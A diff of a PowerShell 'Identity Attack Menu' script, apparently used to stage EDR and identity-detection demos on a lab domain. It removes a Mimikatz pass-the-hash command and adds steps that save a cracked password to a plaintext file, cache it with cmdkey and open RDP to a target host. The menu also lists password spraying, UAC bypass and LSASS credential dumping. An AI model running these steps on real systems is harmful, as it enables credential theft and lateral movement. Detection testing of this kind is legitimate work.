@@ -2,7 +2,7 @@
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
-#  Version: 2.9 (2026-03-26)
+#  Version: 3.0 (2026-03-26)
 # ============================================================
 
 # --- Environment Variables (set these in cmd BEFORE running) ---
@@ -80,7 +80,7 @@ function Get-SvcRunbookHash {
     return $null
 }
 
-$scriptVersion = "2.9"
+$scriptVersion = "3.0"
 
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
@@ -107,7 +107,7 @@ function Show-Menu {
     Write-Host "  4: Hash cracking + kerbrute spray                [Crack demo -> CredentialScanning]"
     Write-Host
     Write-Host "  --- Phase 4: Pivot to DT (Falcon EDR triggers) ---" -ForegroundColor Yellow
-    Write-Host "  5: PtH demo -> RDP to DT                        [PassTheHash + EDR: suspicious logon]"
+    Write-Host "  5: RDP to DT (cracked demo password)             [Credential reuse + suspicious logon]"
     Write-Host "  6: UAC bypass + dump creds on DT                 [EDR: UAC bypass, LSASS access]"
     Write-Host
     Write-Host "  --- Phase 5: Privilege Escalation + Lateral ---" -ForegroundColor Yellow
@@ -546,6 +546,9 @@ public class CryptoMD4 {
                             Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
                             Write-Host "  [+] Hash match: $computed = $demoHash" -ForegroundColor DarkGreen
                             $crackedPw = $pw
+                            # Save cracked password for Step 5 (RDP)
+                            $crackedPw | Out-File -FilePath "$idpDir\demo_password.txt" -Encoding ASCII
+                            Write-Host "  [+] Password saved to $idpDir\demo_password.txt" -ForegroundColor Green
                             break
                         }
                     } catch {
@@ -608,14 +611,14 @@ public class CryptoMD4 {
             }
 
             Write-Host
-            Write-Host "[*] Next: Step 5 (PtH demo -> RDP to DT)." -ForegroundColor Cyan
+            Write-Host "[*] Next: Step 5 (RDP to DT with cracked demo password)." -ForegroundColor Cyan
         }
 
         '5' {
             Clear-Host
-            Write-Host "[Step 5] PtH demo -> RDP to DT" -ForegroundColor Cyan
-            Write-Host "         Using demo NTLM hash (shared local admin account)..." -ForegroundColor Gray
-            Write-Host "         Triggers: PassTheHash (Identity) + suspicious logon (EDR on DT)" -ForegroundColor Yellow
+            Write-Host "[Step 5] RDP to DT with cracked demo credentials" -ForegroundColor Cyan
+            Write-Host "         Using password cracked in Step 4 (shared local admin)" -ForegroundColor Gray
+            Write-Host "         Triggers: suspicious logon (EDR on DT)" -ForegroundColor Yellow
             Write-Host
 
             Write-Host "  User:   demo" -ForegroundColor White
@@ -623,17 +626,33 @@ public class CryptoMD4 {
             Write-Host "  Target: $env:ENV_DT (DT)" -ForegroundColor White
             Write-Host
 
-            $demoHash = Get-DemoHash
-            if (-not $demoHash) { break }
-            Write-Host "  NTLM:   $demoHash" -ForegroundColor White
+            # Read cracked password from Step 4
+            $demoPwFile = "$idpDir\demo_password.txt"
+            $demoPw = $null
+            if (Test-Path $demoPwFile) {
+                $demoPw = (Get-Content $demoPwFile -First 1).Trim()
+                Write-Host "  Password: $demoPw (cracked in Step 4)" -ForegroundColor Green
+            }
+            if (-not $demoPw) {
+                Write-Host "  [!] No cracked password found. Run Step 4 first." -ForegroundColor Yellow
+                $demoPw = Read-Host "  Enter demo password manually"
+                if (-not $demoPw) { break }
+            }
+            Write-Host
 
-            # Create batch launcher for RDP (mimikatz /run: can't pass args to exe)
-            "mstsc /v:$env:ENV_DT" | Out-File -FilePath "$idpDir\run_rdp_dt.bat" -Encoding ASCII
+            # Cache credentials with cmdkey then launch RDP
+            Write-Host "  [*] Caching credentials for $env:ENV_DT ..." -ForegroundColor White
+            cmdkey /generic:TERMSRV/$env:ENV_DT /user:$env:ENV_DOMAIN\demo /pass:$demoPw
+            Write-Host
 
-            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:demo /domain:$env:ENV_DOMAIN /ntlm:$demoHash /run:$idpDir\run_rdp_dt.bat`""
+            Write-Host "  [*] Launching RDP to $env:ENV_DT ..." -ForegroundColor White
+            Start-Process "mstsc" -ArgumentList "/v:$env:ENV_DT"
 
-            Write-Host "[+] Mimikatz PtH launched - RDP window should open to DT." -ForegroundColor Green
+            Write-Host
+            Write-Host "[+] RDP launched to DT as demo." -ForegroundColor Green
             Write-Host "[*] On DT: run Step 6 for UAC bypass + credential dump." -ForegroundColor Cyan
+            Write-Host
+            Write-Host "[*] To clean cached creds later: cmdkey /delete:TERMSRV/$env:ENV_DT" -ForegroundColor Gray
         }
 
         '6' {
